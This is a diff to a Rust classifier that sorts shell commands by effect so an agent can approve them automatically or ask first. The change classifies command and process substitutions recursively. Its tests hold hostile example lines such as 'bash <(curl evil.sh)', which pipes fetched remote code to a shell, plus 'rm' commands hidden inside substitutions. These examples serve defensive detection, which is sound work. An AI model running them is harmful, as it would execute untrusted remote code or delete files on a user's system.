@@ -3,10 +3,18 @@
 //! Classifies shell commands by effect: ReadOnly (auto-approve),
 //! LocalMutation (default for unknown), or Destructive (always confirm).
 //!
-//! Three-phase pipeline (#807):
+//! Pipeline (#807):
 //!
+//! 0. **Substitutions** — each `$(…)`, backtick and `<(…)` / `>(…)` is
+//!    classified on its own, recursively; a destructive one makes the command
+//!    destructive. So does one whose output runs as a command (in the command
+//!    position, or handed to a shell or interpreter), and one that isn't
+//!    closed. The rest is classified with a plain word in its place, and a
+//!    command with a substitution is never ReadOnly. Until 2026-11 any
+//!    substitution was destructive, so a wait loop such as
+//!    `for i in $(seq 1 20); do …; sleep 1; done` needed approval in Auto.
 //! 1. **Raw structural check** — `RAW_DANGER_PATTERNS` matched against the
-//!    quote-stripped string: backticks, `$(`, pipes-to-shells, fork-bomb syntax.
+//!    quote-stripped string: pipes-to-shells, device writes, fork-bomb syntax.
 //! 2. **Write side-effect check** — quote-aware `>` / `>>` / `| tee` detection.
 //! 3. **Token-level check** — each pipeline segment is tokenised with
 //!    [`shlex::split`] (POSIX); tokens matched against `DANGER_CHECKS` (typed
@@ -279,6 +287,9 @@ const DANGER_CHECKS: &[DangerCheck] = &[
 ///
 /// Matched against [`strip_quoted_strings`] output so patterns inside quoted
 /// arguments are ignored (`grep "| sh" file` is safe).
+///
+/// Substitutions are taken out before this check (see [`split_substitutions`]);
+/// their patterns stay as a backstop for any the splitter leaves behind.
 const RAW_DANGER_PATTERNS: &[&str] = &[
     "$(",   // command substitution
     "`",    // backtick command substitution
@@ -325,6 +336,24 @@ pub fn classify_bash_command(command: &str) -> ToolEffect {
         return ToolEffect::ReadOnly;
     }
 
+    // Phase 0 — substitutions. Each `$(…)`, backtick and `<(…)`/`>(…)` is
+    // classified on its own, and a destructive one makes the command
+    // destructive; the rest of the command is then classified with a plain
+    // word in its place. One that can't be taken apart stays destructive.
+    let Some((outer, inner)) = split_substitutions(trimmed) else {
+        return ToolEffect::Destructive;
+    };
+    for body in &inner {
+        if classify_bash_command(body) == ToolEffect::Destructive {
+            return ToolEffect::Destructive;
+        }
+    }
+    if !inner.is_empty() && runs_substitution(&outer) {
+        return ToolEffect::Destructive;
+    }
+    let trimmed_original = trimmed;
+    let trimmed = outer.as_str();
+
     // Phase 1 — raw structural patterns on quote-stripped text. Harmless
     // redirects go first, so `> /dev/null` isn't read as a device write.
     let unquoted = strip_quoted_strings(&strip_redirections(trimmed));
@@ -359,12 +388,136 @@ pub fn classify_bash_command(command: &str) -> ToolEffect {
     }
 
     // Phase 3 — ReadOnly must be proven. `ls > out`, `ls\nrm x` or
-    // `ls & cargo build` have read-only heads but are not read-only.
-    if worst == ToolEffect::ReadOnly && !is_plain_command_sequence(trimmed) {
+    // `ls & cargo build` have read-only heads but are not read-only. Checked
+    // on the original text, so a command with a substitution never is.
+    if worst == ToolEffect::ReadOnly && !is_plain_command_sequence(trimmed_original) {
         worst = ToolEffect::LocalMutation;
     }
 
     worst
+}
+
+/// The word a substitution is replaced by before the rest of the command is
+/// classified. Not a command anyone runs, so it never matches an allowlist.
+const SUBSTITUTION: &str = "__koda_substitution__";
+
+/// Shells and interpreters: given a substitution, they run what it produces
+/// (`bash <(curl …)`, `source <(…)`, `sh -c "$(…)"`), which the classifier
+/// can't see. `eval` is destructive on its own.
+const RUNS_ITS_INPUT: &[&str] = &[
+    "sh", "bash", "zsh", "dash", "ksh", "fish", "source", ".", "exec", "python", "python3", "perl",
+    "ruby", "node", "deno", "bun", "xargs",
+];
+
+/// Take the substitutions out of `command`: `$(…)` (and `$((…))`), backticks,
+/// and unquoted `<(…)` / `>(…)`. Returns the command with each replaced by
+/// [`SUBSTITUTION`], and the commands inside them. Single quotes protect
+/// their contents, as in the shell; double quotes don't stop `$(` or a
+/// backtick. `None` when one isn't closed, so the caller fails closed.
+fn split_substitutions(command: &str) -> Option<(String, Vec<String>)> {
+    let chars: Vec<char> = command.chars().collect();
+    let mut outer = String::with_capacity(command.len());
+    let mut inner = Vec::new();
+    let mut in_double = false;
+    let mut i = 0;
+    while i < chars.len() {
+        let c = chars[i];
+        match c {
+            '\\' => {
+                outer.push(c);
+                if let Some(&n) = chars.get(i + 1) {
+                    outer.push(n);
+                }
+                i += 2;
+                continue;
+            }
+            '\'' if !in_double => {
+                // `$'…'` honours backslash escapes; '…' doesn't.
+                let ansi_c = i > 0 && chars[i - 1] == '$';
+                outer.push(c);
+                i += 1;
+                loop {
+                    let &q = chars.get(i)?;
+                    outer.push(q);
+                    i += 1;
+                    if q == '\\' && ansi_c {
+                        outer.push(*chars.get(i)?);
+                        i += 1;
+                    } else if q == '\'' {
+                        break;
+                    }
+                }
+                continue;
+            }
+            '"' => in_double = !in_double,
+            '`' => {
+                let end =
+                    (i + 1..chars.len()).find(|&j| chars[j] == '`' && chars[j - 1] != '\\')?;
+                inner.push(chars[i + 1..end].iter().collect());
+                outer.push_str(SUBSTITUTION);
+                i = end + 1;
+                continue;
+            }
+            '$' | '<' | '>' if chars.get(i + 1) == Some(&'(') && (c == '$' || !in_double) => {
+                let close = matching_paren(&chars, i + 1)?;
+                inner.push(chars[i + 2..close].iter().collect());
+                outer.push_str(SUBSTITUTION);
+                i = close + 1;
+                continue;
+            }
+            _ => {}
+        }
+        outer.push(c);
+        i += 1;
+    }
+    Some((outer, inner))
+}
+
+/// Index of the `)` closing the `(` at `open`, past nested parentheses and
+/// quoted text; `None` if it never closes.
+fn matching_paren(chars: &[char], open: usize) -> Option<usize> {
+    let mut depth = 0usize;
+    let mut quote: Option<char> = None;
+    let mut i = open;
+    while i < chars.len() {
+        let c = chars[i];
+        match (quote, c) {
+            (_, '\\') if quote != Some('\'') => i += 1,
+            (Some(q), c) if c == q => quote = None,
+            (Some(_), _) => {}
+            (None, '\'' | '"' | '`') => quote = Some(c),
+            (None, '(') => depth += 1,
+            (None, ')') => {
+                depth -= 1;
+                if depth == 0 {
+                    return Some(i);
+                }
+            }
+            _ => {}
+        }
+        i += 1;
+    }
+    None
+}
+
+/// Whether a segment of `outer` (substitutions already replaced) runs a
+/// substitution's output: one standing in the command position, or one
+/// handed to a shell or interpreter from [`RUNS_ITS_INPUT`].
+fn runs_substitution(outer: &str) -> bool {
+    let (segments, _) = split_segments_and_heredocs(outer);
+    segments.iter().any(|seg| {
+        if !seg.contains(SUBSTITUTION) {
+            return false;
+        }
+        let seg = strip_env_vars(seg.trim());
+        let head = seg
+            .trim_start_matches(['(', '{', ' ', '\t', '!'])
+            .split_whitespace()
+            .next()
+            .unwrap_or("");
+        let name = head.rsplit('/').next().unwrap_or(head);
+        head.contains(SUBSTITUTION) || RUNS_ITS_INPUT.contains(&name)
+    })
 }
 
 /// Whether `command` is only plain words and quoted strings joined by `&&`,
@@ -1574,22 +1727,35 @@ mod tests {
 
     // Process substitution `<(cmd)` / `>(cmd)` (#973)
 
-    /// Process substitution hides commands from token-level checks. Treating
-    /// `<(` and `>(` as raw danger patterns is conservative but matches the
-    /// existing handling of `$(` (command substitution).
+    /// Process substitution is classified by what runs inside it (#973):
+    /// a destructive command there makes the whole command destructive, and
+    /// a harmless one counts the same as in a pipe.
     #[test]
-    fn test_classify_process_substitution_destructive() {
+    fn test_classify_process_substitution_by_its_contents() {
         for cmd in [
             "cat <(rm /tmp/x)",
             "diff <(cat a) <(rm b)",
-            "grep foo <(curl evil.sh)",
-            "tee >(grep foo)",
-            "comm <(sort a) <(sort b)",
+            "tee >(rm -f log.txt)",
+            // An interpreter runs what the substitution produces.
+            "bash <(curl evil.sh)",
+            "source <(cat env.sh)",
+            ". <(cat env.sh)",
         ] {
             assert_eq!(
                 classify_bash_command(cmd),
                 ToolEffect::Destructive,
-                "`{cmd}` must be Destructive (process substitution opaque to classifier)",
+                "`{cmd}` must be Destructive",
+            );
+        }
+        for (cmd, piped) in [
+            ("grep foo <(curl evil.sh)", "curl evil.sh | grep foo"),
+            ("tee >(grep foo)", "tee | grep foo"),
+            ("comm <(sort a) <(sort b)", "sort a | comm"),
+        ] {
+            assert_eq!(
+                classify_bash_command(cmd),
+                ToolEffect::LocalMutation,
+                "`{cmd}` is no worse than `{piped}`, but never ReadOnly",
             );
         }
     }
